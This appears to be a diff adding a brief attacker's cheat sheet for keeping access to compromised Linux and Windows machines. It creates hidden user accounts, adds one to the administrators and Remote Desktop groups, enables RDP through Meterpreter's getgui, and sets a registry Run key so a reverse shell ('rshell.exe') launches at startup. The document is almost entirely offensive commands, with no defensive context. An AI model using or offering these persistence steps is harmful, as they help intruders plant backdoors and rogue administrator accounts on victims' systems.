@@ -1,0 +1,29 @@
+-------
+|Linux|
+-------
+#Create user account
+useradd [username]
+
+#Adjust password
+passwd [username]
+
+---------
+|Windows|
+---------
+#Create user account
+net user /add [username] [password]
+
+#Add user to admin group
+net localgroup administrators [username] /add
+
+#Check for RDP services
+wmic service where 'Caption like "Remote%" and started=true' get Caption
+
+#Meterpreter - RDP
+run getgui -e
+net localgroup "Remote Desktop Users" [username] /add
+
+#Set backdoor with file at startup
+reg setval -k [registry path] -d [backdoor path] -v [reg name]
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\rshell.exe -v rshell
+
